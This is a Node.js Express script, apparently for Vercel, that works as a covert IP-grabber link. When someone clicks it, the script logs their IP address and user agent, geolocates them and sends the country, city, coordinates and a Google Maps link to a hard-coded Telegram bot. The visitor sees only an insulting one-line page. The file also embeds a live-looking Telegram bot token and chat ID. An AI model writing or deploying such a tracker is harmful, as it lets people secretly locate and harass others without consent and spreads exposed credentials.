const express = require('express');
const axios = require('axios');
const app = express();

// Replace with your Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = '7749604293:AAHlRr16NUJPHRiQ4QqbRkMKQMzVqFDrUCw';
const TELEGRAM_CHAT_ID = '7064862085';

// Function to send messages to Telegram
const sendToTelegram = (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  }).catch(err => console.error('Error sending message:', err));
};

// Main route — triggers on link click
app.get('/', async (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let userAgent = req.headers['user-agent'];

  // Get IP-based location data
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const location = response.data;
    const googleMapsLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;

    sendToTelegram(`New Visitor:\nIP: ${ip}\nUser Agent: ${userAgent}\nCountry: ${location.country}\nRegion: ${location.regionName}\nCity: ${location.city}\nLatitude: ${location.lat}\nLongitude: ${location.lon}\n\n<a href="${googleMapsLink}">View on Google Maps</a>`);
  } catch (err) {
    console.error('Error fetching location:', err);
  }

  res.send('<h1>Leon du huso</h1>');
});

// Deploy to Vercel
module.exports = app;
